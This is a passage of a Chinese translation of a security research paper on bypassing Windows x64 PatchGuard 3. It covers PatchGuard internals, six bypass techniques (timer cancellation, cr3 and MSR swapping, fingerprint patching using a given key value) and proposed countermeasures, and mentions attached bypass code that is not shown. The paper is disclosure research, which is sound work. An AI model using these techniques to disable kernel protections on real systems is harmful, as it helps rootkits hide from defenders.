第二阶段解码循环完成之后，控制权被转移到现已成为明文的完整性检查例程（所有支撑数据，比如指向内核中关键函数的指针，到这个点上也已经被第二阶段解码循环翻译成了明文）。

本文随附了一个解密 PatchGuard 内存上下文的基础程序的源代码。该程序预期被提供一个文件，其中包含来自内核调试器的 "dq" 日志、覆盖整个内存上下文，外加解密密钥（位于 KDPC + 0x40）和 KDPC->DeferredContext 的值。

#### 4.5) 代码补丁支持（Code Patching Support）

（译注：此小节编号及位置均照原文——它出现在第 3 章之后、第 4 章之前。）

鉴于 PatchGuard 热衷于阻止给内核打补丁的企图，人们可能会以为，所有内核代码本质上都预期在启动时便已一成不变。然而，事实并非如此。有若干种 PatchGuard 支持的、被认可的内核补丁。例如，若干函数（比如 SwapContext）在启用了 hypervisor 支持时，可以以被认可的方式打补丁。以 SwapContext 为例，运行时补丁通过一条跳转把执行重定向到 EnlightenedSwapContext。PatchGuard 似乎通过特殊的豁免来检测并允许对这些函数的补丁（人们可以观察到诸如 SwapContext 这类函数的地址在初始化时被存入 PatchGuard 上下文，据推测正是为了这一目的）。

负责检查 SwapContext 补丁完整性的代码如下所示。因为这个检查确保一次分支只能跳到 EnlightenedSwapContext，想要利用这段代码在 SwapContext 处做任意补丁会很困难。

```
cmp     rdi, [rbx+PATCHGUARD_CONTEXT.SwapContext]
jnz     short NotSwapContextExemption
cmp     byte ptr [rdi], 0EBh ; 'd' ; backward jmps (short)
jnz     short NotSwapContextExemption
cmp     byte ptr [rdi+1], 0F9h ; '·'
jnz     short NotSwapContextExemption
cmp     byte ptr [rdi-5], 0E9h ; 'T' ; jmp (long)
jnz     short NotSwapContextExemption
mov     rcx, [rbx+PATCHGUARD_CONTEXT.EnlightenedSwapContext]
movsxd  rax, dword ptr [rdi-4]
sub     rcx, rdi
cmp     rax, rcx
jz      short BadSwapContextHook
```

还存在第二组 PatchGuard 必须允许的补丁，这是为了与较老的处理器兼容。Intel 非常早期发布的 x64 处理器没有实现 prefetch（预取）指令，于是内核支持检测 prefetch 指令上的非法操作码故障，并随即动态地把 prefetch 操作码补丁掉。然而，这类动态补丁通常是不被 PatchGuard 允许的（理由显而易见），至少在没有特殊支持的情况下不被允许。在初始化期间，PatchGuard 生成一些执行一次 prefetch 操作的代码，然后检查在执行这段补丁代码之后，被补丁的 prefix（前缀）指令的计数是否被增加了。假设处理器是较老的、不支持 prefetch 的型号，那么一个特殊的豁免（“prefetch 白名单”）会被激活，它把一份以镜像基址为起点的 RVA（相对虚拟地址）列表从 PatchGuard 的检查中豁免出去。这份 RVA 列表被存储在一个附加在 ntoskrnl.exe 后面的二进制资源中（名为 "PREFETCHWLIST"）。

在启动时检测 prefetch 豁免是否应被启用的代码如下（对 Windows Server 2008 Beta 3 而言，检查的结果被存储在 PatchGuard 上下文内偏移 2B1 处）：

```
call    KeGetPrcb
mov     ecx, 2
cmp     [rax+63Dh], cl  ; Prcb->CpuVendor
mov     [rsp+0EC8h+var_D48], rax
jnz     short SkipEnablePrefetchPatchExemption
lea     rdx, [rsi+214h] ; PrefetchRoutineCode
mov     dword ptr [rdx], 0C3090D0Fh ; prefetch [rcx] ; ret
mov     ebx, cs:KiOpPrefetchPatchCount
lea     rcx, [rsp+0EC8h+arg_18]
call    rdx
mov     ecx, cs:KiOpPrefetchPatchCount
cmp     ebx, ecx
jz      short SkipEnablePrefetchPatchExemption

mov     [rsi+2B1h], dil ; EnablePrefetchPatchExemption

SkipEnablePrefetchPatchExemption:
;
; Initialization continues ...
;
mov     eax, 100000h
```

### 4) 绕过机制与反制措施（Bypass Mechanisms and Countermeasures）

和 PatchGuard 2 一样，若声称 PatchGuard 3 对蓄意执行被 PatchGuard 阻止的操作的第三方驱动代码的攻击刀枪不入，那将是愚蠢的。针对 PatchGuard 3 的新防御有许多可能的攻击（以及微软可能采取的若干可能的反制措施，以便在未来某个 PatchGuard 迭代中破掉所提出的绕过机制）。本文将描述能够击败 PatchGuard 3 的具体攻击。

#### 4.1) 混合异常拦截与内存搜索（Hybrid Exception Interception and Memory Searching）

由于 PatchGuard 3 在 SEH 执行的情形下，对其各个 PatchGuard 上下文使用完全随机化的（自解密的）代码块与数据块，一般来说不可能通过非分页池扫描轻易地定位并禁用 PatchGuard 上下文。此外，由于 PatchGuard 3 不再在所有情形下都依赖 SEH 来调用 PatchGuard，一般来说也不可能通过拦截 SEH 分发代码路径来可靠地禁用 PatchGuard 3。

尽管这些防御确实彼此互补，仍然存在可被第三方利用的弱点。具体来说，当 PatchGuard 通过一个经 SEH 调用的、被借用的 DPC 例程运行时，它是脆弱的：SEH 分发代码路径可以被拦截，以便在 PatchGuard 被执行之前定位（并禁用）它。此外，在 PatchGuard 在没有任何 SEH 混淆的情况下运行的情形下，它对内存搜索是脆弱的，因为（必然）会有一些静态代码被放置在非分页池内存中，这段代码负责在 DPC 函数的调用约定与 PatchGuard 第一阶段解密例程的调用约定之间做转换。

通过把内存搜索的办法与前面描述的 SEH 拦截办法结合起来，就有可能同时攻击 PatchGuard 的两条启动向量，其效果是不论在一次具体启动中使用哪一条（或哪几条）向量，都能把它禁用。

然而，在 SEH 拦截这一情形下，仍有一些难点需要解决。如前所述，基于 SEH 混淆的启动向量相对 PatchGuard 2 有了显著改进：从异常分发器逻辑本身的视角看，异常信息被混淆、调用栈被随机化。要用这一办法成功地对 PatchGuard 3 发动攻击，这些障碍必须被克服。

与异常信息的混淆和随机化有关的第一个问题，结果并不是人们乍看之下可能以为的那种路障。混淆逻辑有一些弱点：如果一个人巧妙地检查在 _C_specific_handler 这个点上可获得的信息，异常的真面目还是会透出来。此外，还可以在比 _C_specific_handler 更低的层面上挂钩，比如 KiGeneralProtectionFault（通过检查 IDT 即可轻易定位），这样一来，就能在汇编语言异常处理逻辑有机会篡改异常信息之前介入。

尽管 KiGeneralProtectionFault 这个向量更易于实现，因为它就 SEH 相关的 PatchGuard 执行代码路径而言，完全绕过了其中一项新的防御机制，但仍然可以用 _C_specific_handler 来攻击 PatchGuard，其办法是依赖 _C_specific_handler 被调用时的信息泄漏。具体来说，被 PatchGuard 改动过的所有异常都源于内核本身的范围之内，所有这些异常都有两个参数（像 STATUS_INSUFFICIENT_RESOURCES 这类异常的绝大多数“合法”版本总是零个参数，因为它们源于 RtlRaiseStatus 内部，而 RtlRaiseStatus 从不在异常记录中存储任何异常参数），并且在调用栈的某个地方，负责分发 DPC 或定时器 DPC 的内核例程将会出现。

通过把这些事实结合起来，就有可能高度准确地判定一个异常究竟是不是由 PatchGuard 引起的。最后这条信息（检查负责调用 DPC 或定时器 DPC 的例程是否在调用栈中）后来在必须抵消加到 SEH 代码路径上的第二项防御——即调用栈的随机化——时，也证明是有价值的。

为了判定 DPC 或定时器 DPC 分发器是否在某个给定的调用栈中，首先有必要在内核镜像中定位它。这里有一些复杂之处。首先，定时器 DPC 分发器例程中有三条可以调用定时器 DPC 的 call 指令，并非所有这些指令都容易触发。此外，定时器 DPC 分发器和 DPC 分发器都不是导出的。

然而，虽然不可能简单地索要这两个例程的地址，却可以通过经由已公开的 DPC 与定时器 DPC 的 API 请求执行一个 DPC 和一个定时器 DPC，来以编程方式找到它们。从 DPC 或定时器 DPC 例程内部，就可以用编译器内部函数 ReturnAddress() 定位返回地址。这一招之所以管用，是因为返回地址保证位于 DPC 或定时器 DPC 分发器之内。或者，也可以写一个汇编语言例程，它简单地检查调用时 [rsp] 处的当前指针。

这在定时器 DPC 分发器的情形下仍然留下一个问题，因为那里有三条 call 指令，而且按需观察来自定时器 DPC 分发器内全部三个调用站点的调用并不容易，因为有必要在运行时以编程方式找到这些返回点。然而再一次，正是那些对 x64 SEH 支持至关重要的元数据，在这一办法上给 PatchGuard 判了死刑：可以从任何函数中间的任意一条指令出发，沿着链式的展开元数据一路跟随，直到到达一个没有父级的展开元数据块，从而到达该函数的起始处 [4]。这个顶层的展开元数据块持有一个指向函数第一条指令的引用。既然现在可以从一个函数内部任意一个有效的指令位置定位到该函数的起始处，那么判定两个地址是否驻留在同一个函数中就变得微不足道：为此，只需对两个地址都沿展开元数据链跟随，然后检查两个顶层展开元数据块是否指向同一个函数。凭借这一技术，再结合能够定位定时器 DPC 分发器内至少一个调用站点的能力，就再次有可能识别出定时器 DPC 分发器，因为无论使用哪一个调用站点，都保证该调用站点驻留在定时器 DPC 分发器例程 KiTimerExpiration 之内。通过比较顶层展开元数据块，就有可能权威地辨别任意一条指令是否驻留在定时器 DPC 分发器之内。

还有可能通过从 _C_specific_handler 本身出发做一次栈回溯——而不是依赖上下文记录或异常处理程序信息——来绕过 KiCustomAccessHandler（被借用的 DPC 例程的那些汇编语言“第一机会”异常处理例程）对异常（以及指令指针）地址所做的改动。这是因为调用栈被传递时的样子，就好像被借用的 DPC 调用栈中那条出错指令是一次对 KiGeneralProtectionFault 的调用现场一样。其结果是，为了展开的目的，可以用当前上下文替换呈现给 _C_specific_handler 的上下文。这也提供了一层防御，以防微软在未来的 PatchGuard 版本中改动异常处理程序上下文中的其他寄存器——那可能导致手动展开返回不正确的寄存器值，从而在一次意图实现从被借用的 DPC 例程中硬返回的展开之后导致系统崩溃。

此外，通过巧妙地使用这一“判定一个地址是否驻留在某个具体函数内”的机制，现在还有可能为任何给定的被借用的 DPC 例程判定其真正的返回地址。具体来说，通过检查截至 _C_specific_handler 时调用栈中的每一个地址是否位于 DPC 分发器或定时器 DPC 分发器之内，就可以判定某个给定的调用帧是否对应于那个调用了被借用的 DPC 例程的调用站点，而不受被借用的 DPC 之上可能层叠的任意随机数量的伪造函数调用的影响。这反过来又击败了对 SEH PatchGuard 代码路径的剩余改进，因为再一次地，从 PatchGuard 异常调用栈中的任意一点干净地展开出去成了可能。

通过把这两方面的能力结合起来——要么完全规避 KiCustomAccessHandler 对传递给 _C_specific_handler 的异常信息所制造的欺骗，要么“看穿”它；以及恢复一个被借用的 DPC 例程的正确返回地址的能力——现在禁用 PatchGuard 3 的 SEH 控制流路径就成了可能。这就只剩下最后一个拼图：定位非分页池内存中 PatchGuard 的非 SEH 控制流路径。然而，定位那个把一次 DPC 例程调用适配为一次对 PatchGuard 第一阶段解密桩调用的跳板例程是微不足道的，因为这个适配跳板是静态的，并且就写入解密桩开头的那些常量而言，含有一个非常容易辨认的签名。为了禁用这个跳板例程，只需简单地用一条 "ret" 指令给它打补丁就够了（效果与 SEH 绕过技术相同，只不过这一次是以代码实现、而不是一次虚拟展开）。

本文随附了一份可以工作的、针对 PatchGuard 3 的混合异常拦截与内存搜索绕过技术的实现源代码。

尽管这一办法成功地禁用了当前迭代的 PatchGuard 3，它并非没有弱点。例如，微软可以通过改动无 SEH 的 PatchGuard DPC 到解密桩的适配器、使其不再是静态的（即把运行时放入非分页池的代码随机化），来废掉这一技术。基于 SEH 的办法也有若干假设，可能被微软在未来的 PatchGuard 版本中废掉。然而，鉴于可以在比异常分发器路径本身更低的层面上获得控制流（即给 KiGeneralProtectionFault 打补丁），作者认为，更好的做法是把重点放在：在任何异常处理程序（汇编的或 C 语言的）被调用之前、而不是在那个定义性时刻（换句话说，就是异常）发生之后，移除相关信息，因为正是那个异常向外部攻击者呈现了第一个容易触及的拦截点。

#### 4.2) 定时器 DPC 分发器与 DPC 分发（Timer DPC Dispatcher and DPC Dispatching）

尽管 PatchGuard 3 在执行系统完整性检查方面消除了 SEH 这一单点故障，定时器与 DPC 分发器仍然继续是有吸引力的目标。一个简单的绕过机制是定位这两个例程中的调用站点（比如按绕过技术 1 所述记录两个分发器例程的地址，然后做反汇编以定位并给所有调用站点打补丁）。在每一个调用站点上，都可以通过寻找一个非规范的 DeferredContext 参数值、或者一个驻留在非分页池内的 DeferredRoutine，来检测出 PatchGuard 正在被执行。（在 PatchGuard 3 中，只实现前一个检查就证明已经足够了，因为为了 PatchGuard 3 实现上的方便，被借用的 DPC 例程与基于非 SEH 的控制路径都使用兼容的调用约定，该约定规定以一个非规范的混淆指针值作为 DeferredContext 参数。）

这一办法的主要缺点，涉及在 x64 上执行任意代码补丁所固有的困难（具体来说，任何代码补丁的尺寸都很大，以及如今相对常见的指令指针相对寻址指令数量众多）。然而，鉴于这是一个影响 x64 上任何代码补丁的困难，作者认为，对于一个有决心的攻击者而言，它不应被视为一个大问题。事实上，Microsoft Research 自家的 Detours 就实现了一个针对 x64 的代码补丁系统 [5]，这说明总的来说在 x64 上做代码补丁绝不是一项应被视为不可逾越的任务。

因为定时器与 DPC 分发器仍然是相对缺乏保护的目标，而且迄今还没有已发布的公开绕过源代码牵涉它们，作者建议为下一个 PatchGuard 版本加强定时器与 DPC 分发器的防御，因为这两个例程继续代表着一个有吸引力的单点故障。增加第三种根本不涉及传统 DPC 的 PatchGuard 执行机制，就是消除与 DPC 分发器相关的逻辑这一单点故障的一个办法的例子。还可以通过以下组合来增加定位 DPC 分发相关代码内全部调用站点的难度：为定时器 DPC 分发器的三个调用站点中的每一个设置不同的静态调用栈差异（即加入虚设的函数调用），再在这静态调用栈差异之上叠加调用栈随机化。光有随机的调用栈并不够，因为通过检查许多次定时器 DPC 请求迭代的调用栈，在样本量足够大时，以相对高的准确度消除那些随机条目（它们不会是所有记录下来的调用栈共有的）会变得容易。采取这种办法的一个缺点是，它本质上会导致把故意难以维护的“面条代码”加入到操作系统的又一个关键区域（定时器 DPC 分发器逻辑）中。作者猜测，维护定时器 DPC 分发器代码的人很可能不会乐意应付这类事情。

#### 4.3) 取消 PatchGuard 定时器（Canceling the PatchGuard Timer(s)）

由于 PatchGuard 继续依赖定时器 DPC 来执行它的检查例程，内核定时器 DPC 列表本身继续是一个相对有吸引力的攻击目标。定时器 DPC 列表是通向 PatchGuard 的所有控制路径共有的，因为定时器总是被用作那个周期性调用检查例程的延迟执行组件。

目前横在定时器 DPC 列表面前的障碍有两道。第一道是：改动它依赖于定位非导出的内核变量。虽然也许可以通过指纹识别来做到这一点，但这确实使这一办法比它起初看上去的要稍微不那么诱人。不过，如果做得仔细，指纹识别是可以奏效的，而且有许多短小的函数以相当可预测的方式引用定时器列表（例如 KeCancelTimer）。找到 DPC 列表的另一种可能办法是，创建并设置一个定时器（从而把它插入定时器列表），然后扫描 ntoskrnl 中一个非分页的未初始化数据节里的每一个 8 字节对齐的值，把每一个有效地址当作一个链表来处理，并在前若干个条目中搜索那个刚刚被链入列表的定时器。虽然这是一个相当难看的、基于蛮力的办法（而且也不完全安全，因为要严重依赖 MmIsAddressValid），但扫描 ntoskrnl 的数据节是就找到定时器列表而言、指纹识别之外的一个替代方案。

这一办法的第二个问题是：从 PatchGuard 2 开始，定时器列表本身被混淆，使得一个 KTIMER 对象与其对应的 KDPC 之间的链接被混淆。这一混淆机制，如前面所描述的（回指 1），围绕另外两个非导出的内核变量（KiWaitAlways、KiWaitNever）打转，它们充当混淆密钥。定位这些变量很可能需要对那些需要把一个定时器插入定时器列表的（可能是导出的）例程——比如 KeSetTimerEx——做代码分析或指纹识别。

另一个完全免于指纹识别和/或蛮力办法的替代方案——代价是需要增加复杂性（一个用户模式组件）——是把任何会触犯 PatchGuard 的驱动代码的激活推迟到用户模式的 Win32 被启动之后。然后可以创建一个用户模式服务，它会下载正在使用的内核二进制的符号，取回 KiTimerTableListHead（定时器列表）、KiWaitNever 与 KiWaitAlways 的地址，并经由任何标准的用户模式到内核模式通信机制（比如 DeviceIoControl）把这些地址传递给驱动。因为内核调试器依赖于能通过 PDB 符号按名字取回这些变量、供 !kdexts.timer 扩展使用，微软将无法通过移除或改名这些混淆密钥变量来封堵这一办法而不损害现有调试器二进制的功能。

一旦定位了 KiTimerTableListHead、KiWaitAlways 与 KiWaitNever，遍历定时器列表、去混淆每个相应定时器对象上的 DPC 链接、并从那里逐个检查每个定时器看它是否具有是一个 PatchGuard 定时器的特征（可能包括诸如一个在未来数分钟之后的定时间隔、一个非规范的 DeferredContext 值，以及可能一个指向非分页池的 DPC 例程指针等属性），就是一件相当简单的事情了（尽管在没有同步的情况下也许不安全，不过人总可以采取“大锤”办法：停掉除一个 CPU 之外的所有 CPU，并把 IRQL 抬到 HIGH_LEVEL）。在定位了所涉定时器之后，它可以被轻易地禁用（要么把它从列表中整个移除，比如经由 KeCancelTimer，要么把它的 DPC 例程改写成指向一个空函数，该函数什么操作都不做、简单地返回）。

因为微软在调试器中有依赖于能使用这些变量来访问定时器列表的功能，就当前的操作系统版本而言，他们不幸把自己逼到了某种墙角，因为微软的一般政策是：现有的调试器二进制在某个已发布的操作系统版本被打了热修复或服务包之后，仍应继续正常工作。抵消这一办法的最佳方式，是让 PatchGuard DPC 在内存中相对于任何给定时刻列表中其他全部定时器 DPC 对象更难被挑出来，并为 PatchGuard 创建不那么严重依赖定时器列表的额外启动向量。还存在许多其他执行代码、又不会引起一个不知道自己在看什么的人注意的办法，其中很多都比一个定时器不那么显眼。

#### 4.4) 页表交换（Page-Table Swap）

和 Windows 内核中的一切内存访问一样，PatchGuard 的系统完整性检查例程在启用了分页的保护模式下运作。理论上也许可以利用这一事实来向 PatchGuard 隐藏内核补丁。

所提出的绕过技术将涉及：给定时器与 DPC 分发器中的第一条指令打补丁，使其分支到第三方代码。当 DPC 与定时器 DPC 即将被考虑执行时——这由对两个分发器例程之一的一次调用发出信号——一份页表的影子副本被创建出来。这份影子副本被配置成与当前进程的正常页表完全相同，只是任何已被打补丁的内核代码页的页表项被改动成指向代表原始状态的物理页。栈上 DPC 或定时器 DPC 分发器的返回地址被替换成一个指向驱动提供的代码的指针，cr3 被重新配置成指向影子页表。然后，执行被转移回定时器或 DPC 分发器的入口点（由于页表交换，它不再显现任何被打补丁的迹象），DPC 被分发。当分发器完成它的工作——如果 PatchGuard 要在任何一批定时器 DPC 中被执行，这工作就包括调用 PatchGuard——之后，控制权被交回驱动提供的代码，后者随后把自影子副本被做出来之后发生的任何页表修改镜像回进程的实际页表，并把 cr3 恢复成它的原始值。然后控制权被转移到分发器的正常返回点。

这一办法根本不涉及禁用 PatchGuard。相反，它描述了一种可能与它“和平共存”的方式，前提是只做内核代码补丁。（数据页则预计会被一个 DPC 修改，作者认为以这种方式保护它们免于 PatchGuard 要不切实际得多。）因为 DPC 与定时器 DPC 分发器逻辑在 IRQL DISPATCH_LEVEL 上执行，当前线程的线程上下文切换被禁用，这使得 cr3 交换办法相对可行。

因为这一办法不涉及直接攻击 PatchGuard，它自动地规避了当前版本 PatchGuard 中内置的种种防御机制，这使它成为一条相当有吸引力的潜在攻击路线。然而，它也有一些缺点。其中就包括，在多处理器环境中完成一次页表交换所需的同步，很可能复杂且难以安全地复制——如果一个人允许 DPC 例程执行改变 PTE 的操作的话。此外，这一办法还会带来性能上的影响，因为它需要在系统整个存续期间持续运行在一条影响相对较大的路径（DPC 分发）上。在每一批 DPC 上都使 TLB 失效所带来的性能含义在某些情况下可能成问题（交换 cr3 会自动清空 TLB）。

这一办法的另一个缺点是：凭借所有 DPC（以及潜在地所有设备硬件中断）都可能运行在页表影子副本之下的这一事实，大多数与硬件相关的事件将不受到被这一机制隐藏的内核代码补丁的影响。这是否成问题，取决于期望的内核补丁目标是什么。

微软可以通过在 PatchGuard 初始化时做一份描述内核的全部 PTE 的拷贝、然后从 PatchGuard 检查例程内部校验全部内核代码 PTE，来抵消这一办法。此外，如果微软可以假设 PatchGuard 总是在系统进程中执行，另一个办法是要求 cr3 取一个已知的值。

#### 4.5) DPC 异常处理程序补丁（DPC Exception Handler Patching）

PatchGuard 3 相对 PatchGuard 2 引入的改动之一，是调用解密过程第一阶段所用协议的一处小小改变。具体来说，一个加密的 PatchGuard 上下文的全部调用者，现在都包含一个静态的 8 字节字符串（由指令操作码组成），它与 PatchGuard 上下文开头的一个值做 xor，构成初始的解密密钥。

做出这一改变（相对原有行为）的原因，在作者看来并不清楚，但它不幸成了禁用 PatchGuard 的一个容易的目标，因为这个字符串本身（0x8513148113148F0）在内核代码中相当独特，不太可能出现在 PatchGuard 之外。此外，所有 PatchGuard 调用者——包括全部十个被借用的 DPC 例程异常处理程序，以及非分页池内存中的 DPC 适配器（如果被使用的话）——都毫无混淆地引用这个字符串。这就呈现出一种极其容易的、基于指纹的禁用 PatchGuard 的办法。通过扫描非分页池空间以及内核代码区域来找这个字符串，定位每一条负责调用 PatchGuard 检查上下文的代码路径中间的一条指令，是微不足道地容易。

在定位了引用这个 8 字节字符串的指令之后，给它们打补丁、使之执行一次从异常处理逻辑中展开出去（或者在非分页池内存代码的情形下，直接返回），是微不足道的。这样一种攻击阻止 PatchGuard 根本启动，而且还具有一个优势：与本文所概述的许多其他绕过技术相比，它所需要的额外支撑逻辑最少。

微软废掉这一技术将是微不足道的。作者的建议是去掉每个 PatchGuard 调用者中引用的那个静态 8 字节字符串。具有讽刺意味的是，PatchGuard 2 必然有一个类似的 4 字节字符串（它在 PatchGuard 3 中也仍然被使用），它代表第一阶段解密桩的初始指令。然而，与 PatchGuard 3 不同，PatchGuard 2 小心地混淆了把操作码字符串写出到 PatchGuard 上下文的过程，这样一来，人们就不能简单地用一个单一的、全覆盖的指纹来覆盖所有情形。PatchGuard 3 中所做的这一改变，可以说是把这项工作完全付诸东流了，而且它还多了一个好处：作为一个可供指纹识别的值，它是前者的两倍大。

#### 4.6) 系统调用 MSR 交换（System Call MSR Swap）

作为前面描述的技术（回指 4）的一个变体，理论上应该有可能在 DPC 或定时器 DPC 分发的持续期间，在线地交换系统调用 MSR（或者事实上，还有其他若干个受 PatchGuard 保护的处理器控制寄存器），并在分发器返回之后恢复那些“被污染的”值。系统调用 MSR 负责指定系统调用分发器的地址，因此对那些想要做系统调用挂钩的第三方来说，是一个有吸引力的目标。

这一技术将应用与前面在 cr3 交换技术中描述的相同的基本概念。如果系统调用是唯一打算挂钩的目标，那么对单处理器系统来说，cr3 交换可以被消除，因为它是不必要的（因为可以安全地在一次 DPC 分发器调用之前和之后做并恢复对实际底层物理页的改动，利用栈上的返回地址作为一种办法，在不让操作码在分发器调用之间一直留在内核中被打补丁的情况下，返回到那个被改动的位置）。对多处理器系统而言，需要开发某种机制，允许 MSR 交换在 DPC 分发器之间进行，同时防止代码补丁对第二个处理器变得可见。这一点之所以必要，是因为随着 PatchGuard 3 增加了在系统启动时有一定概率初始化第二个检查上下文，可能会有不止一个 PatchGuard 上下文同时执行。

为了封堵这样一种技术，微软最可能受到良好服务的做法是：让人难以定位为了在各次 PatchGuard 检查之间维持一个未打补丁系统的假象所必需补丁的全部区域。做到这一点的主要方式，是为 PatchGuard 创建其他与 DPC 无关的替代启动向量，并且最好不涉及从第三方视角看容易拦截的导出 API。

### 5) 结论（Conclusion）

尽管 PatchGuard 3 确实对许多此前已披露的绕过技术带来了若干有针对性的反击，但第 3 版和它的前任们一样，远非免疫于被完全禁用或被简单地共存。未来 PatchGuard 的修订版本很可能继续易受多种绕过技术的影响，不过，封堵许多公开披露的绕过向量无疑是在微软力所能及的范围之内的。作者预计，直到 PatchGuard 能以硬件支持来实现——比如经由可信启动（TPM）与一个常驻 hypervisor 的组合——未来的修订版本仍将继续易受有决心的个人攻击。

另一方面，就阻止 Windows x64 上违反 PatchGuard 的驱动被大规模采用而言，微软在 PatchGuard 上的努力迄今看上去已经得到了回报。换句话说，可以提出这样一个论点：微软不需要在 PatchGuard 上做到完美，只需要做到“足够好”，好到让供应商对试图出货绕过它的产品心生怯意。至于这一点在未来是否仍将成立，只有时间能告诉我们。

### 参考文献（References）

[1] Skywing. Subverting PatchGuard version 2.
    http://www.uninformed.org/?v=6&a=1&t=sumry；访问于 2007 年 9 月 16 日

[2] Skywing. Programming against the x64 exception handling support, part 7: Putting it all together, or building a stack walking routine.
    http://www.nynaeve.net/?p=113；访问于 2007 年 9 月 16 日

[3] skape. Improved Automated Analysis of Windows x64 Binaries.
    http://uninformed.org/index.cgi?v=4&a=1&t=sumry；访问于 2007 年 9 月 16 日

[4] skape, Skywing. Bypassing PatchGuard on Windows x64.
    http://uninformed.org/index.cgi?v=3&a=3&t=sumry；访问于 2007 年 9 月 16 日

[5] Microsoft. Detours.
    http://research.microsoft.com/sn/detours/；访问于 2007 年 9 月 16 日

（全文完）
